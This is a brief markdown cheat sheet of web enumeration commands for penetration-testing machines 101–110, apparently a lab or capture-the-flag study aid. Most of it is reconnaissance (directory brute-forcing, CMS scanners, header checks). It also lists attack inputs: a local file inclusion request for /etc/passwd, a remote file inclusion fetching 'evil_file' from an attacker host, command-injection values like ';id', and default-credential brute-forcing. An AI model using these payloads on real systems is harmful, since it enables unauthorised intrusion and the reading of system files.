## 🌐 Web Enumeration (Machines 101–110)

```bash
# Check for common web directories and services
curl -I http://<IP>/admin.php
curl -I http://<IP>/config.php
curl -I http://<IP>/backup

# Try default credentials
# Examples: admin:admin, root:toor
# Use tools like Hydra or Burp Suite for brute-force attempts

# Check for exposed directories
curl -I http://<IP>/.git/
curl -I http://<IP>/uploads

# Local File Inclusion (LFI) / Remote File Inclusion (RFI)
curl http://<IP>/index.php?file=../../etc/passwd
curl http://<IP>/index.php?file=http://<attacker_IP>/evil_file

# Command Injection
curl http://<IP>/vuln.php?input=;id
curl http://<IP>/vuln.php?input=|whoami

# CMS Detection and Enumeration
whatweb http://<IP>
wpscan --url http://<IP> --enumerate u,v
joomscan --url http://<IP>
drupwn enum -u http://<IP>

# Directory Enumeration
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php,html

# Additional Headers Check
curl -I http://<IP>
nikto -h http://<IP>
```
